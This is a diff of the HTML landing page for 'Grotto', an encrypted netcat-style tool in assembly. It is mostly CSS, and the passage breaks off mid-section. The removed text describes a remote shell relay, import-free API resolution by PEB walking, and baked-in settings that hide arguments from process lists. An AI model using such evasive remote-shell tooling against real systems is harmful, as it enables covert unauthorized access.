@@ -3,972 +3,386 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Grotto — ChaCha20-Poly1305 Encrypted Networking in Assembly</title>
-    <meta name="description" content="ChaCha20-Poly1305 authenticated encryption networking tool in pure x86_64 NASM assembly. Cross-platform, zero dependencies, ~8 KB binary.">
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext y='26' font-size='26'%3E%F0%9F%AA%A8%3C/text%3E%3C/svg%3E">
+    <title>Grotto — Encrypted Netcat in Assembly</title>
+    <meta name="description" content="ChaCha20-Poly1305 encrypted netcat in pure x86_64 NASM assembly. Cross-platform Linux ELF and Windows PE. Zero dependencies. ~8KB binary.">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext x='16' y='24' text-anchor='middle' font-family='Inter,sans-serif' font-size='24' font-weight='800' fill='%2374c7ec'%3EG%3C/text%3E%3C/svg%3E">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --red: #f38ba8;
-            --maroon: #eba0ac;
-            --pink: #f5c2e7;
-            --mauve: #cba6f7;
-            --lavender: #b4befe;
-            --blue: #89b4fa;
-            --sapphire: #74c7ec;
-            --sky: #89dceb;
-            --teal: #94e2d5;
-            --green: #a6e3a1;
-            --yellow: #f9e2af;
-            --peach: #fab387;
-            --text: #cdd6f4;
-            --subtext1: #bac2de;
-            --subtext0: #a6adc8;
-            --overlay2: #9399b2;
-            --overlay1: #7f849c;
-            --overlay0: #6c7086;
-            --surface2: #585b70;
-            --surface1: #45475a;
-            --surface0: #313244;
-            --base: #1e1e2e;
-            --mantle: #181825;
-            --crust: #11111b;
+        *{margin:0;padding:0;box-sizing:border-box}
+        :root{
+            --accent1:#74c7ec;--accent2:#b4befe;--accentmid:#89b4fa;
+            --accentrgb:116,199,236;
+            --text:#cdd6f4;--sub1:#bac2de;--sub0:#a6adc8;
+            --ov2:#9399b2;--ov1:#7f849c;--ov0:#6c7086;
+            --sf2:#585b70;--sf1:#45475a;--sf0:#313244;
+            --base:#1e1e2e;--mantle:#181825;--crust:#11111b;
+            --green:#a6e3a1;--yellow:#f9e2af;--red:#f38ba8;
+            --peach:#fab387;--mauve:#cba6f7;--teal:#94e2d5;
         }
+        body{font-family:'Inter',system-ui,sans-serif;background:var(--crust);color:var(--text);line-height:1.7;overflow-x:hidden}
+        ::selection{background:rgba(var(--accentrgb),0.3);color:var(--text)}
+        .container{max-width:1140px;margin:0 auto;padding:0 28px}
+        code{font-family:'JetBrains Mono',monospace;background:var(--mantle);padding:2px 7px;border-radius:3px;font-size:.88em;color:var(--green)}
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: var(--base);
-            color: var(--text);
-            line-height: 1.7;
-            overflow-x: hidden;
-        }
-
-        body::before {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background-image: radial-gradient(circle, var(--overlay0) 1px, transparent 1px);
-            background-size: 24px 24px;
-            opacity: 0.15;
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        body::after {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1), rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
-            pointer-events: none;
-            z-index: 999;
-            opacity: 0.4;
-        }
-
-        ::selection { background: rgba(116, 199, 236, 0.3); color: var(--text); }
-
-        a { color: var(--sapphire); text-decoration: none; transition: color 0.2s; }
-        a:hover { color: var(--sky); }
-
-        a:focus-visible, .btn:focus-visible {
-            outline: 2px solid var(--sapphire);
-            outline-offset: 2px;
-        }
-
-        code {
-            font-family: 'JetBrains Mono', monospace;
-            background: var(--mantle);
-            padding: 2px 7px;
-            border-radius: 3px;
-            font-size: 0.88em;
-            color: var(--green);
-        }
-
-        .container { max-width: 1140px; margin: 0 auto; padding: 0 28px; }
+        /* ── Nav ── */
+        .nav{position:fixed;top:0;left:0;right:0;height:56px;background:rgba(17,17,27,0.8);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid rgba(49,50,68,0.5);z-index:1000;display:flex;align-items:center;justify-content:center}
+        .nav-inner{max-width:1140px;width:100%;padding:0 28px;display:flex;align-items:center;justify-content:space-between}
+        .nav-logo{font-family:'Inter',sans-serif;font-size:16px;font-weight:700;color:var(--text);text-decoration:none}
+        .nav-links{display:flex;align-items:center;gap:28px}
+        .nav-links a{font-size:13px;font-weight:500;color:var(--ov0);text-decoration:none;transition:color .2s}
+        .nav-links a:hover{color:var(--text)}
+        .nav-cta{background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);padding:7px 18px;border-radius:8px;font-size:13px;font-weight:600;text-decoration:none;transition:box-shadow .2s,transform .2s}
+        .nav-cta:hover{box-shadow:0 0 20px rgba(var(--accentrgb),0.3);transform:translateY(-1px)}
 
         /* ── Hero ── */
-        .hero {
-            padding: 100px 0 70px;
-            text-align: center;
-            position: relative;
-        }
-
-        .hero::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 10%;
-            right: 10%;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--surface1), transparent);
-        }
-
-        .hero-logo {
-            max-width: 440px;
-            margin: 0 auto 32px;
-        }
-
-        .hero-logo img { width: 100%; height: auto; }
-
-        .hero .subtitle {
-            font-size: clamp(15px, 2vw, 18px);
-            color: var(--subtext0);
-            max-width: 680px;
-            margin: 0 auto 28px;
-            line-height: 1.7;
-        }
-
-        .hero .warning {
-            background: rgba(243, 139, 168, 0.07);
-            border: 1px solid rgba(243, 139, 168, 0.3);
-            border-radius: 6px;
-            padding: 14px 24px;
-            margin: 28px auto;
-            max-width: 720px;
-            font-size: 13px;
-            line-height: 1.6;
-            color: var(--subtext1);
-        }
-
-        .hero .warning strong { color: var(--red); }
-
-        /* ── Stats ── */
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 16px;
-            margin: 48px 0;
-        }
-
-        .stat {
-            background: var(--surface0);
-            border: 1px solid var(--surface1);
-            border-radius: 8px;
-            padding: 20px 16px;
-            text-align: center;
-            transition: transform 0.2s, border-color 0.2s;
-        }
-
-        .stat:hover { transform: translateY(-2px); border-color: var(--surface2); }
-
-        .stat-value {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 28px;
-            font-weight: 700;
-            line-height: 1;
-        }
-
-        .stat:nth-child(1) .stat-value { color: var(--teal); }
-        .stat:nth-child(2) .stat-value { color: var(--blue); }
-        .stat:nth-child(3) .stat-value { color: var(--mauve); }
-        .stat:nth-child(4) .stat-value { color: var(--red); }
-
-        .stat-label { font-size: 12px; color: var(--overlay1); margin-top: 6px; letter-spacing: 0.03em; }
-
-        /* ── CTAs ── */
-        .cta-group { display: flex; gap: 14px; justify-content: center; margin-top: 36px; }
-
-        .btn {
-            padding: 13px 32px;
-            border-radius: 6px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 13px;
-            font-weight: 600;
-            text-decoration: none;
-            letter-spacing: 0.03em;
-            transition: all 0.2s;
-            display: inline-block;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, var(--sapphire), var(--blue));
-            color: var(--crust);
-        }
-
-        .btn-primary:hover {
-            box-shadow: 0 0 24px rgba(116, 199, 236, 0.35);
-            transform: translateY(-2px);
-        }
-
-        .btn-secondary {
-            background: var(--surface0);
-            color: var(--text);
-            border: 1px solid var(--surface1);
-        }
-
-        .btn-secondary:hover { background: var(--surface1); border-color: var(--surface2); }
-
-        .btn-ghost {
-            background: transparent;
-            color: var(--subtext1);
-            border: 1px solid var(--surface1);
-        }
-
-        .btn-ghost:hover { background: var(--surface0); color: var(--text); }
-
-        /* ── Sections ── */
-        section { padding: 72px 0; }
-
-        section h2 {
-            font-size: clamp(28px, 4vw, 42px);
-            font-weight: 700;
-            margin-bottom: 12px;
-            color: var(--text);
-            letter-spacing: -0.02em;
-        }
-
-        .section-desc {
-            font-size: 15px;
-            color: var(--subtext0);
-            margin-bottom: 44px;
-            max-width: 640px;
-            line-height: 1.7;
-        }
-
-        /* ── Feature Grid ── */
-        .features {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 20px;
-        }
-
-        .feature {
-            background: var(--surface0);
-            border: 1px solid var(--surface1);
-            border-radius: 8px;
-            padding: 28px;
-            transition: all 0.25s;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .feature::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--sapphire), var(--lavender));
-            opacity: 0;
-            transition: opacity 0.25s;
-        }
-
-        .feature:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.25);
-            border-color: var(--surface2);
-        }
-
-        .feature:hover::before { opacity: 1; }
-
-        .feature h3 {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 15px;
-            font-weight: 600;
-            color: var(--sapphire);
-            margin-bottom: 10px;
-            letter-spacing: 0.02em;
-        }
-
-        .feature p { font-size: 13.5px; color: var(--subtext1); line-height: 1.65; }
-
-        /* ── Capabilities ── */
-        .capabilities {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-            gap: 10px;
-        }
-
-        .capability {
-            background: var(--surface0);
-            border: 1px solid var(--surface1);
-            border-radius: 20px;
-            padding: 9px 18px;
-            font-size: 12.5px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            transition: all 0.2s;
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .capability:hover { border-color: var(--surface2); background: var(--surface1); }
-
-        .cap-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
-        .cap-dot.api { background: var(--green); }
-        .cap-dot.net { background: var(--blue); }
-        .cap-dot.chacha { background: var(--teal); }
-        .cap-dot.aead { background: var(--mauve); }
-        .cap-dot.exec { background: var(--peach); }
-        .cap-dot.relay { background: var(--red); }
-
-        .cap-legend {
-            display: flex;
-            justify-content: center;
-            gap: 24px;
-            flex-wrap: wrap;
-            margin-top: 20px;
-            font-size: 12px;
-            color: var(--overlay1);
-        }
-
-        .cap-legend span {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        /* ── Platform Cards ── */
-        .platform-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
-
-        .platform-card {
-            background: var(--surface0);
-            border: 1px solid var(--surface1);
-            border-radius: 8px;
-            padding: 28px;
-            transition: all 0.25s;
-        }
-
-        .platform-card:hover {
-            transform: translateY(-2px);
-            border-color: var(--surface2);
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
-        }
-
-        .platform-card h3 {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 16px;
-        }
-
-        .platform-card .platform-item {
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            padding: 6px 0;
-            font-size: 13px;
-            color: var(--subtext1);
-            line-height: 1.5;
-        }
-
-        .p-dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            flex-shrink: 0;
-            margin-top: 7px;
-        }
-
-        .p-dot.linux { background: var(--green); }
-        .p-dot.win { background: var(--blue); }
+        .hero{padding:140px 0 80px;text-align:center;position:relative}
+        .hero::before{content:'';position:absolute;top:60px;left:50%;transform:translateX(-50%);width:800px;height:400px;background:radial-gradient(ellipse,rgba(var(--accentrgb),0.08) 0%,transparent 60%);pointer-events:none}
+        .hero-logo{position:relative;max-width:600px;margin:0 auto 32px}
+        .hero-logo img{width:100%;height:auto}
+        .hero-tagline{position:relative;font-size:clamp(24px,3.5vw,38px);font-weight:700;line-height:1.2;margin-bottom:16px;background:linear-gradient(135deg,var(--accent1),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+        .hero-desc{position:relative;font-size:16px;color:var(--ov0);max-width:560px;margin:0 auto 32px}
+        .hero-ctas{position:relative;display:flex;gap:12px;justify-content:center;margin-bottom:48px}
+        .btn-primary{background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);padding:12px 28px;border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;text-decoration:none;transition:box-shadow .2s,transform .2s}
+        .btn-primary:hover{box-shadow:0 0 24px rgba(var(--accentrgb),0.35);transform:translateY(-2px)}
+        .btn-secondary{background:var(--sf0);color:var(--text);padding:12px 28px;border-radius:8px;border:1px solid var(--sf1);font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:500;text-decoration:none;transition:all .2s}
+        .btn-secondary:hover{background:var(--sf1);border-color:var(--sf2)}
 
         /* ── Terminal ── */
-        .terminal {
-            background: var(--mantle);
-            border: 1px solid var(--surface1);
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
-        }
+        .terminal{position:relative;max-width:800px;margin:0 auto;background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,0.5),0 0 24px rgba(var(--accentrgb),0.06)}
+        .terminal-bar{background:var(--crust);padding:12px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--sf0)}
+        .terminal-dot{width:12px;height:12px;border-radius:50%}
+        .terminal-dot:nth-child(1){background:var(--red)}
+        .terminal-dot:nth-child(2){background:var(--yellow)}
+        .terminal-dot:nth-child(3){background:var(--green)}
+        .terminal-label{flex:1;text-align:center;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--ov0)}
+        .terminal-body{padding:24px;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.9;text-align:left}
+        .terminal-body pre{margin:0;white-space:pre-wrap;word-wrap:break-word}
+        .t-g{color:var(--green)}.t-b{color:var(--accent1)}.t-m{color:var(--sub0)}.t-p{color:var(--peach)}
 
-        .terminal-bar {
-            background: var(--crust);
-            padding: 10px 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            border-bottom: 1px solid var(--surface0);
-        }
+        /* ── Stats ── */
+        .stats{display:flex;justify-content:center;gap:40px;padding:60px 0;position:relative}
+        .stat{text-align:center}
+        .stat-num{font-family:'JetBrains Mono',monospace;font-size:36px;font-weight:700;color:var(--accent1);line-height:1}
+        .stat-label{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--sf2);margin-top:6px;letter-spacing:2px;text-transform:uppercase}
+        .stat-div{width:1px;height:48px;background:var(--sf0);align-self:center}
 
-        .terminal-dot { width: 12px; height: 12px; border-radius: 50%; }
-        .terminal-dot:nth-child(1) { background: var(--red); }
-        .terminal-dot:nth-child(2) { background: var(--yellow); }
-        .terminal-dot:nth-child(3) { background: var(--green); }
-        .terminal-label { flex: 1; text-align: center; font-size: 11px; color: var(--overlay0); font-family: 'JetBrains Mono', monospace; }
+        /* ── Sections ── */
+        section{padding:80px 0}
+        .section-label{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:600;color:var(--accent1);letter-spacing:3px;text-transform:uppercase;margin-bottom:12px}
+        .section-title{font-size:clamp(28px,4vw,40px);font-weight:700;margin-bottom:12px;letter-spacing:-.02em}
+        .section-desc{font-size:15px;color:var(--ov0);margin-bottom:48px;max-width:560px}
+        .gradient-line{height:1px;background:linear-gradient(90deg,transparent,var(--accent1),var(--accent2),transparent);margin:0 auto;max-width:600px}
 
-        .terminal-body {
-            padding: 24px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 13px;
-            line-height: 1.8;
-        }
+        /* ── Bento ── */
+        .bento{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+        .bento-card{background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;padding:28px;transition:all .25s;position:relative;overflow:hidden}
+        .bento-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent1),var(--accent2));opacity:0;transition:opacity .25s}
+        .bento-card:hover{transform:translateY(-3px);border-color:var(--sf1);box-shadow:0 12px 32px rgba(0,0,0,0.25),0 0 20px rgba(var(--accentrgb),0.06)}
+        .bento-card:hover::before{opacity:1}
+        .bento-hero{grid-column:span 2}
+        .bento-card h3{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600;color:var(--accent1);margin-bottom:8px}
+        .bento-card p{font-size:13.5px;color:var(--sub0);line-height:1.6}
+        .bento-card .mini-terminal{background:var(--crust);border-radius:8px;padding:14px;margin-top:14px;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.8;text-align:left}
+        .bento-stat{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
+        .bento-stat .big{font-family:'JetBrains Mono',monospace;font-size:42px;font-weight:700;color:var(--accent1)}
+        .bento-stat .label{font-size:12px;color:var(--sf2);margin-top:4px;letter-spacing:1px}
 
-        .terminal-body .p { color: var(--green); }
-        .terminal-body .c { color: var(--overlay0); }
-        .terminal-body .v { color: var(--sapphire); }
-        .terminal-body .f { color: var(--peach); }
-        .terminal-body .s { color: var(--green); }
+        /* ── Pills ── */
+        .pills{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px}
+        .pill{background:var(--mantle);border:1px solid var(--sf0);border-radius:20px;padding:9px 18px;font-family:'JetBrains Mono',monospace;font-size:12px;display:flex;align-items:center;gap:8px;transition:all .2s;color:var(--sub0)}
+        .pill:hover{border-color:var(--sf1);background:var(--base)}
+        .dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+        .dot-g{background:var(--green)}.dot-y{background:var(--yellow)}.dot-n{background:var(--sf2)}
 
-        /* ── Architecture Diagram ── */
-        .arch-diagram {
-            background: var(--mantle);
-            border: 1px solid var(--surface1);
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow:
-                0 0 0 1px var(--surface0),
-                0 24px 80px -12px rgba(0, 0, 0, 0.5),
-                0 0 120px -40px rgba(116, 199, 236, 0.06);
-        }
+        /* ── Arch ── */
+        .arch-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+        .arch-card{background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;padding:28px;transition:border-color .2s}
+        .arch-card:hover{border-color:var(--sf1)}
+        .arch-num{display:inline-flex;width:30px;height:30px;background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);border-radius:50%;align-items:center;justify-content:center;font-weight:700;font-size:14px;margin-bottom:14px}
+        .arch-card h3{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600;color:var(--teal);margin-bottom:8px}
+        .arch-card p{font-size:13.5px;color:var(--sub0);line-height:1.6}
 
-        .arch-bar {
-            background: var(--crust);
-            padding: 10px 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            border-bottom: 1px solid var(--surface0);
-        }
+        /* ── Two Col ── */
+        .two-col{display:grid;grid-template-columns:1fr 1fr;gap:20px}
 
-        .arch-bar-label { flex: 1; text-align: center; font-size: 11px; color: var(--overlay0); font-family: 'JetBrains Mono', monospace; }
-
-        .arch-body { padding: 32px; }
-
-        .flow-diagram {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0;
-            flex-wrap: nowrap;
-        }
-
-        .flow-node {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .flow-node-box {
-            padding: 14px 24px;
-            border: 1px solid var(--surface1);
-            border-radius: 6px;
-            background: var(--base);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 14px;
-            font-weight: 600;
-            color: var(--teal);
-            white-space: nowrap;
-        }
-
-        .flow-node-label {
-            font-size: 11px;
-            color: var(--overlay1);
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-        }
-
-        .flow-arrows {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 6px;
-            padding: 0 16px;
-            flex-shrink: 0;
-        }
-
-        .flow-arrow {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 11px;
-            color: var(--overlay1);
-            white-space: nowrap;
-        }
-
-        .flow-arrow-line {
-            width: 60px;
-            height: 1px;
-            background: var(--surface2);
-            position: relative;
-        }
-
-        .flow-arrow-line::after {
-            content: '';
-            position: absolute;
-            right: -1px;
-            top: -3px;
-            border: 3px solid transparent;
-            border-left: 5px solid var(--surface2);
-        }
-
-        .flow-arrow.left .flow-arrow-line::after {
-            right: auto;
-            left: -1px;
-            border-left: none;
-            border-right: 5px solid var(--surface2);
-        }
-
-        .flow-tag {
-            padding: 2px 8px;
-            border-radius: 3px;
-            background: var(--surface0);
-            font-size: 10px;
-            letter-spacing: 0.04em;
-        }
-
-        .flow-tag.tcp { color: var(--green); }
-        .flow-tag.enc { color: var(--mauve); }
-
-        .arch-divider {
-            border: none;
-            border-top: 1px dashed var(--surface1);
-            margin: 28px 0;
-        }
-
-        /* ── Wire format bar ── */
-        .wire-label {
-            font-size: 12px;
-            color: var(--overlay1);
-            font-weight: 500;
-            margin-bottom: 12px;
-            letter-spacing: 0.04em;
-        }
-
-        .wire-bar {
-            display: flex;
-            border-radius: 6px;
-            overflow: hidden;
-            border: 1px solid var(--surface1);
-        }
-
-        .wire-seg {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 14px 0;
-            gap: 4px;
-            border-right: 1px solid var(--surface1);
-        }
-
-        .wire-seg:last-child { border-right: none; }
-
-        .wire-seg-name {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        .wire-seg-detail {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 10px;
-            opacity: 0.7;
-        }
-
-        .wire-seg.len {
-            flex: 1;
-            background: rgba(148, 226, 213, 0.08);
-            color: var(--teal);
-        }
-
-        .wire-seg.nonce {
-            flex: 1.5;
-            background: rgba(137, 180, 250, 0.08);
-            color: var(--blue);
-        }
-
-        .wire-seg.ct {
-            flex: 3;
-            background: rgba(249, 226, 175, 0.08);
-            color: var(--yellow);
-        }
-
-        .wire-seg.mac {
-            flex: 1.5;
-            background: rgba(203, 166, 247, 0.08);
-            color: var(--mauve);
-        }
+        /* ── Detection ── */
+        .detect-card{background:var(--mantle);border-radius:12px;padding:28px}
+        .detect-card h3{font-size:14px;margin-bottom:14px;display:flex;align-items:center;gap:8px}
+        .detect-card ul{list-style:none;font-size:13px;color:var(--sub0);line-height:2.2}
+        .detect-hidden{border-left:3px solid var(--green)}.detect-hidden h3{color:var(--green)}
+        .detect-visible{border-left:3px solid var(--yellow)}.detect-visible h3{color:var(--yellow)}
 
         /* ── Footer ── */
-        .site-footer {
-            border-top: 1px solid var(--surface0);
-            padding: 56px 0;
-            text-align: center;
-        }
+        footer{padding:48px 0;margin-top:40px}
+        .footer-line{height:1px;background:linear-gradient(90deg,transparent,var(--accent1),var(--accent2),transparent);margin-bottom:48px}
+        .footer-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:32px}
+        .footer-grid h4{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text);margin-bottom:14px;letter-spacing:2px;text-transform:uppercase}
+        .footer-grid ul{list-style:none}
+        .footer-grid li{margin-bottom:8px}
+        .footer-grid a{color:var(--ov2);text-decoration:none;font-size:13px;transition:color .2s}
+        .footer-grid a:hover{color:var(--accent1)}
+        .footer-grid p{font-size:13px;color:var(--ov1);line-height:1.7}
+        .footer-bottom{text-align:center;margin-top:36px;padding-top:24px;border-top:1px solid var(--sf0);font-size:12px;color:var(--ov0)}
 
-        .footer-tagline {
-            font-size: 18px;
-            font-weight: 600;
-            color: var(--subtext1);
-            margin-bottom: 8px;
-        }
-
-        .footer-sub {
-            font-size: 13px;
-            color: var(--overlay1);
-            margin-bottom: 28px;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 32px;
-            margin-bottom: 28px;
-            flex-wrap: wrap;
-        }
-
-        .footer-links a {
-            font-size: 13px;
-            color: var(--overlay1);
-            transition: color 0.2s;
-        }
-
-        .footer-links a:hover { color: var(--sapphire); }
-
-        .footer-copy {
-            font-size: 12px;
-            color: var(--overlay0);
-        }
-
-        .footer-toolkit {
-            margin-top: 24px;
-            font-size: 12px;
-            color: var(--overlay0);
-        }
-
-        .footer-toolkit a {
-            color: var(--overlay1);
-            margin: 0 4px;
-        }
-
-        .footer-toolkit a:hover { color: var(--sapphire); }
+        /* ── Animate ── */
+        .animate{opacity:0;transform:translateY(24px);transition:opacity .6s ease,transform .6s ease}
+        .animate.visible{opacity:1;transform:translateY(0)}
+        .animate-scale{opacity:0;transform:translateY(24px) scale(.97);transition:opacity .8s ease,transform .8s ease}
+        .animate-scale.visible{opacity:1;transform:translateY(0) scale(1)}
 
         /* ── Responsive ── */
-        @media (max-width: 900px) {
-            .stats { grid-template-columns: repeat(2, 1fr); }
-            .features { grid-template-columns: 1fr; }
-            .platform-grid { grid-template-columns: 1fr; }
-            .capabilities { grid-template-columns: repeat(2, 1fr); }
-        }
+        @media(max-width:960px){.bento{grid-template-columns:1fr 1fr}.bento-hero{grid-column:span 2}.two-col,.arch-grid{grid-template-columns:1fr}.footer-grid{grid-template-columns:repeat(2,1fr)}.stats{flex-wrap:wrap;gap:24px}}
+        @media(max-width:600px){.container{padding:0 16px}.hero{padding:100px 0 48px}.bento{grid-template-columns:1fr}.bento-hero{grid-column:span 1}.stats{gap:16px}.stat-div{display:none}.nav-links a:not(.nav-cta){display:none}.footer-grid{grid-template-columns:1fr}.pills{grid-template-columns:repeat(auto-fill,minmax(140px,1fr))}}
 
-        @media (max-width: 600px) {
-            .hero { padding: 60px 0 48px; }
-            .hero-logo { max-width: 300px; }
-            .stats { grid-template-columns: 1fr 1fr; }
-            .cta-group { flex-direction: column; align-items: center; }
-            .btn { width: 100%; max-width: 260px; text-align: center; }
-            .flow-diagram { flex-direction: column; gap: 16px; }
-            .flow-arrows { flex-direction: row; padding: 0; }
-            .flow-arrow-line { width: 30px; }
-            .arch-body { padding: 20px; }
-            .terminal-body { padding: 16px; font-size: 12px; }
-            .cap-legend { gap: 12px; }
-        }
+        a:focus-visible{outline:2px solid var(--accent1);outline-offset:2px}
     </style>
 </head>
 <body>
 
-<div class="container">
-
-    <!-- ════════════ HERO ════════════ -->
-    <section class="hero">
-        <div class="hero-logo">
-            <img src="assets/logo-dark.svg" alt="Grotto">
-        </div>
-
-        <p class="subtitle">
-            ChaCha20-Poly1305 authenticated encryption networking tool in pure x86_64 NASM assembly.
-            Cross-platform. Zero dependencies. Full AEAD. ~8 KB.
-        </p>
-
-        <div class="stats">
-            <div class="stat">
-                <div class="stat-value">~8 KB</div>
-                <div class="stat-label">Windows PE</div>
-            </div>
-            <div class="stat">
-                <div class="stat-value">~13 KB</div>
-                <div class="stat-label">Linux ELF</div>
-            </div>
-            <div class="stat">
-                <div class="stat-value">256-bit</div>
-                <div class="stat-label">PSK Encryption</div>
-            </div>
-            <div class="stat">
-                <div class="stat-value">RFC 8439</div>
-                <div class="stat-label">AEAD Standard</div>
-            </div>
-        </div>
-
-        <div class="cta-group">
-            <a href="https://github.com/Real-Fruit-Snacks/Grotto" class="btn btn-primary">View Source</a>
-            <a href="#architecture" class="btn btn-secondary">Architecture</a>
-            <a href="#quick-start" class="btn btn-ghost">Quick Start</a>
-        </div>
-
-        <div class="warning">
-            <strong>Authorization Required:</strong> This tool is designed exclusively for authorized security testing
-            with explicit written permission. Unauthorized access to computer systems is illegal and may result in
-            criminal prosecution.
-        </div>
-    </section>
-
-    <!-- ════════════ FEATURES ════════════ -->
-    <section id="features">
-        <h2>Pure assembly. Fully encrypted.</h2>
-        <p class="section-desc">
-            Every byte handcrafted in NASM. No compiler, no runtime, no import table.
-            ChaCha20-Poly1305 AEAD with bidirectional encrypted relay &mdash; Linux and Windows from the same codebase.
-        </p>
-
-        <div class="features">
-            <div class="feature">
-                <h3>ChaCha20-Poly1305</h3>
-                <p>Full RFC 8439 AEAD in pure assembly. 256-bit PSK, fresh random nonce per message, Poly1305 MAC verification rejects tampered payloads.</p>
-            </div>
-            <div class="feature">
-                <h3>Cross-Platform</h3>
-                <p>Dual-target build: Linux (~13 KB static ELF) and Windows (~8 KB minimal PE). Shared crypto core, platform-specific networking. Same wire protocol, full interop.</p>
-            </div>
-            <div class="feature">
-                <h3>PEB Walk + Hash Lookup</h3>
-                <p>All Windows APIs resolved at runtime via PEB walking and ror13 hash matching. No import table, no strings. Linux uses raw syscalls with no libc.</p>
-            </div>
-            <div class="feature">
-                <h3>Encrypted Shell Relay</h3>
-                <p>The -e flag spawns an interactive shell (cmd.exe or /bin/sh) with stdin/stdout piped through the encrypted channel. Full bidirectional AEAD relay.</p>
-            </div>
-            <div class="feature">
-                <h3>No Dependencies</h3>
-                <p>Zero DLL imports on Windows. No libc on Linux. Every API resolved dynamically from the PEB or via raw syscalls. Nothing to link against.</p>
-            </div>
-            <div class="feature">
-                <h3>Baked Builds</h3>
-                <p>Compile host, port, key, and exec command directly into the binary. Zero arguments at runtime &mdash; nothing visible in the process list.</p>
-            </div>
-        </div>
-    </section>
-
-    <!-- ════════════ CAPABILITIES ════════════ -->
-    <section id="capabilities">
-        <h2>Every component from scratch.</h2>
-        <p class="section-desc">
